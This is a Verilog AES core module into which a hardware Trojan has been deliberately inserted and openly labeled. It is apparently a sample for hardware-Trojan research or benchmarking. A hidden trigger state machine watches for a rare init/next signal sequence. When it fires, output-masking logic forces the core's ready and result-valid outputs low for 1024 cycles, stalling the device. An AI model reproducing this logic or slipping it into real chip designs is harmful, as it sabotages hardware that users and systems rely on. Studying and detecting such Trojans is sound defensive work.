module aes_core(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid
               );

  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;

  //----------------------------------------------------------------
  // Trojan parameters and registers
  //----------------------------------------------------------------
  // Trojan state definitions
  localparam TROJAN_OFF  = 2'b00;
  localparam TROJAN_TRIG = 2'b01;
  localparam TROJAN_ON   = 2'b10;

  // Trojan registers
  reg [1:0] trojan_state_reg, trojan_state_new;
  reg       trojan_state_we;
  reg [9:0] trojan_counter_reg, trojan_counter_new; // 10 bits for 1024 cycles
  reg       trojan_counter_we;
  reg [3:0] trojan_seq_reg, trojan_seq_new;
  reg       trojan_seq_we;

  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;


  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */


  //----------------------------------------------------------------
  // Instantiations.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  aes_key_mem keymem(
                     .clk(clk),
                     .reset_n(reset_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw)
                    );


  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  // Trojan: Use masked result and ready signals during attack
  wire t_ready, t_result_valid;
  assign ready        = t_ready;
  assign result       = muxed_new_block;
  assign result_valid = t_result_valid;

  //----------------------------------------------------------------
  // reg_update
  //
  // Update functionality for all registers in the core.
  // All registers are positive edge triggered with asynchronous
  // active low reset. All registers have write enable.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          result_valid_reg  <= 1'b0;
          ready_reg         <= 1'b1;
          aes_core_ctrl_reg <= CTRL_IDLE;

          //-------------------------------
          // TROJAN INSERTION: Reset logic
          //-------------------------------
          trojan_state_reg   <= TROJAN_OFF;
          trojan_counter_reg <= 10'd0;
          trojan_seq_reg     <= 4'd0;
        end
      else
        begin
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          if (ready_we)
            ready_reg <= ready_new;

          if (aes_core_ctrl_we)
            aes_core_ctrl_reg <= aes_core_ctrl_new;

          //-------------------------------
          // TROJAN INSERTION: Registers update
          //-------------------------------
          if (trojan_state_we)
            trojan_state_reg <= trojan_state_new;

          if (trojan_counter_we)
            trojan_counter_reg <= trojan_counter_new;

          if (trojan_seq_we)
            trojan_seq_reg <= trojan_seq_new;
        end
    end // reg_update

  //----------------------------------------------------------------
  // sbox_mux
  //
  // Controls which of the encipher datapath or the key memory
  // that gets access to the sbox.
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        begin
          muxed_sboxw = keymem_sboxw;
        end
      else
        begin
          muxed_sboxw = enc_sboxw;
        end
    end // sbox_mux


  //----------------------------------------------------------------
  // encdex_mux
  //
  // Controls which of the datapaths that get the next signal, have
  // access to the memory as well as the block processing result.
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          // Encipher operations
          enc_next        = next;
          muxed_round_nr  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          // Decipher operations
          dec_next        = next;
          muxed_round_nr  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end // encdec_mux

  //----------------------------------------------------------------
  // TROJAN INSERTION: Trigger FSM
  // This FSM watches for a rare event: the sequence of
  // init, next, init, next, next (five consecutive events in this pattern)
  //----------------------------------------------------------------
  always @*
    begin : trojan_fsm
      trojan_state_new    = trojan_state_reg;
      trojan_state_we     = 1'b0;
      trojan_counter_new  = trojan_counter_reg;
      trojan_counter_we   = 1'b0;
      trojan_seq_new      = trojan_seq_reg;
      trojan_seq_we       = 1'b0;

      // Trojan locked-out state
      case (trojan_state_reg)
        TROJAN_OFF: begin
          // Watch for pattern: init->1, next->0, init->1, next->0, next->0 (others=0)
          // Sequence encoding (4 bits):
          // seq 0: Wait init==1
          // seq 1: Wait next==1
          // seq 2: Wait init==1
          // seq 3: Wait next==1
          // seq 4: Wait next==1 (trigger)
          if (trojan_seq_reg == 4'd0) begin
            if (init && !next) begin
              trojan_seq_new = 4'd1;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd1) begin
            if (!init && next) begin
              trojan_seq_new = 4'd2;
              trojan_seq_we  = 1'b1;
            end
            else if (!init && !next) begin
              // must keep waiting
              trojan_seq_new = 4'd1;
              trojan_seq_we  = 1'b1;
            end
            else begin
              // Sequence broken, reset.
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd2) begin
            if (init && !next) begin
              trojan_seq_new = 4'd3;
              trojan_seq_we  = 1'b1;
            end
            else if (!init && !next) begin
              trojan_seq_new = 4'd2;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd3) begin
            if (!init && next) begin
              trojan_seq_new = 4'd4;
              trojan_seq_we  = 1'b1;
            end
            else if (!init && !next) begin
              trojan_seq_new = 4'd3;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd4) begin
            if (!init && next) begin
              // TRIGGER THE TROJAN
              trojan_state_new    = TROJAN_ON;
              trojan_state_we     = 1'b1;
              trojan_counter_new  = 10'd0;
              trojan_counter_we   = 1'b1;
              trojan_seq_new      = 4'd0; // reset seq track
              trojan_seq_we       = 1'b1;
            end
            else if (!init && !next) begin
              trojan_seq_new = 4'd4;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else begin
            trojan_seq_new = 4'd0;
            trojan_seq_we  = 1'b1;
          end
        end
        TROJAN_ON: begin
          if (trojan_counter_reg < 10'd1023) begin
            trojan_counter_new = trojan_counter_reg + 10'd1;
            trojan_counter_we  = 1'b1;
            // Stay in THIS STATE
            trojan_state_new = TROJAN_ON;
            trojan_state_we  = 1'b0;
          end else begin
            // Done with lockout
            trojan_state_new = TROJAN_OFF;
            trojan_state_we  = 1'b1;
            trojan_counter_new = 10'd0;
            trojan_counter_we  = 1'b1;
            trojan_seq_new = 4'd0;
            trojan_seq_we  = 1'b1;
          end
        end
        TROJAN_TRIG: begin
          // Not used; placeholder for expansion
          trojan_state_new = TROJAN_OFF;
          trojan_state_we  = 1'b1;
          trojan_counter_new = 10'd0;
          trojan_counter_we  = 1'b1;
          trojan_seq_new = 4'd0;
          trojan_seq_we  = 1'b1;
        end
        default: begin
          trojan_state_new = TROJAN_OFF;
          trojan_state_we  = 1'b1;
          trojan_counter_new = 10'd0;
          trojan_counter_we  = 1'b1;
          trojan_seq_new = 4'd0;
          trojan_seq_we  = 1'b1;
        end
      endcase
    end // trojan_fsm

  //----------------------------------------------------------------
  // aes_core_ctrl
  //
  // Control FSM for aes core. Basically tracks if we are in
  // key init, encipher or decipher modes and connects the
  // different submodules to shared resources and interface ports.
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                init_state        = 1'b0;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        default:
          begin
            // Default assignments to prevent latch inference
            init_state = 1'b0;
            ready_new  = 1'b1;
            ready_we   = 1'b0;
            result_valid_new = 1'b0;
            result_valid_we = 1'b0;
            aes_core_ctrl_new = CTRL_IDLE;
            aes_core_ctrl_we = 1'b0;
          end
      endcase // case (aes_core_ctrl_reg)
    end // aes_core_ctrl

  //----------------------------------------------------------------
  // TROJAN INSERTION: Output masking logic.
  // When the Trojan is active, output ports ready/result_valid are deasserted (system stuck).
  //----------------------------------------------------------------
  assign t_ready        = (trojan_state_reg == TROJAN_ON) ? 1'b0 : ready_reg;
  assign t_result_valid = (trojan_state_reg == TROJAN_ON) ? 1'b0 : result_valid_reg;

endmodule